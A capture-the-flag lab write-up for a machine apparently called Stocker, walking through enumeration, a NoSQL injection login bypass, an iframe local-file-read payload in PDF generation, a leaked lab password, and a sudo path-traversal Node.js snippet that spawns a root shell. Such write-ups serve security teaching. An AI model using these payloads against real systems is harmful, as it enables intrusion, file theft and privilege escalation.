# Stocker

## Analysis

- nmap scan reveals open ports `80` and `22`
  - ssh version `OpenSSH 8.2p1 Ubuntu 4ubuntu0.5`
  - webserver running `Eleventy v2.0.0`
    - nothing interesting on default webpage

- enumerated subdomains (via vhost enumeration)
  - first used gobuster, then ffuf which was much faster
  - found secret subdomain `dev.stocker.htb/login`

- tested login provided at `dev.stocker.htb/login`
  - default credentials did not work
  - checked for SQL injections -> did not work
  - checked for NoSQL injections -> did not work
    - needed to change the `Content-Type Header` to `application/json` ([details](https://www.youtube.com/watch?v=AJc53DUdt1M&t=220s))
    - this allows to bypass login via NoSQL injection

- provided website allows to create order and to print pdf file, which contains user controlled input
  - tried to apply techniques to read local files from server (see `./server_lfi.py`)
    - using `<iframe src=file://{path_to_file} width="1000" height="1000"></iframe>` did the job
    - automated file read in `./server_lfi.py`


## Solution

### User flag

- We could not read the user flag directly using the LFI, thus we needed to enumerate further. 
The idea was fo find some sort of user credentials.
Leaking the file `/etc/passw` showed the user `angoose`.

- During the NoSQL injection phase the server leaked the path to the application: `/var/www/dev`.
Reading about the docs of `Eleventy` I tried to leak the file `index.js`.
This file also leaked a MongoDB password, which allows shh login: `angoose/IHeardPassphrasesArePrettySecure`


### System flag
- the user `angoose` is allowed to run the following commands as superuser: `sudo /usr/bin/node /usr/local/scripts/*.js`
- this can be exploited by creating the file `/tmp/sh.js`. Content:
```javascript
require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})
```
- Running the following command as superuser spaws a root shell:
```bash
sudo /usr/bin/node /usr/local/scripts/../../../../tmp/sh.js
```
